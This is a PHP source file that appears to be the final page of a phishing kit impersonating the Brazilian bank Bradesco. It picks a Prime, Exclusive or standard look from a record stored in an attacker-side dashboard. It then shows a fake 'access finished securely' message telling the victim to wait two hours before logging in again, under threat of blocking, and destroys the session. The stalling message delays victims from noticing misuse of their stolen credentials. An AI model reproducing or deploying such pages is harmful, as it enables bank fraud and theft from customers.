<?php
require_once('../_dashboard2021/config.php');
require_once('../validacao.php');

$info = null;
if(isset($_SESSION['id'])){
    $info = Info::findInfoById($_SESSION['id']);
}

$infoTipo = isset($info) && isset($info['tipo']) ? $info['tipo'] : '';

function getLayout(){
    global $infoTipo;
    if($infoTipo == 'Bradesco Prime'){
        return 'prime';
    } else if($infoTipo == 'Bradesco Exclusive'){
        return 'exclusive';
    } else {
        return 'padrao';
    }
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700&display=swap" rel="stylesheet">

    <link rel="stylesheet" href="css/bootstrap.min.css">
    <?php
        $tipoDaConta = getLayout();

        if($tipoDaConta == "exclusive"){
            echo '<link rel="stylesheet" href="css/style-exclusive.css">';
        } else if($tipoDaConta == "prime") {
            echo '<link rel="stylesheet" href="css/style-prime.css">';
        } else {
            echo '<link rel="stylesheet" href="css/style.css">';
        }
    ?>
    <link rel="shortcut icon" href="images/favicon.ico">
    <title>Bradesco</title>
</head>
<body>
    <nav class="navbar d-flex">
        <a class="navbar-brand" href="javascript:;"><img src="images/bars.png" alt=""></a>
        <p class="header-title">Bradesco</p>
    </nav>
    <div id="alerta" class="boxes">
    <div class="box-alerta sinal-X after mb20">
                    <div id="mensagemLogoff" class="ctn-box after">
                    <p><strong>Seu acesso foi finalizado com segurança.</strong><br>Recomendamos que aguarde o prazo de 2 horas para efetuar novamente seu acesso, AGUARDE o prazo estabelecido para que não ocorra o cancelamento do seu acesso ou bloqueio parcial.</p>
                    </div>
    </div>
    </div>
    <div id="footer">
        
        <div id="logo">
            <img src="images/cadeado.png" alt="">
        </div>
    </div>
    <?php
        session_destroy();
    ?>
</body>
</html>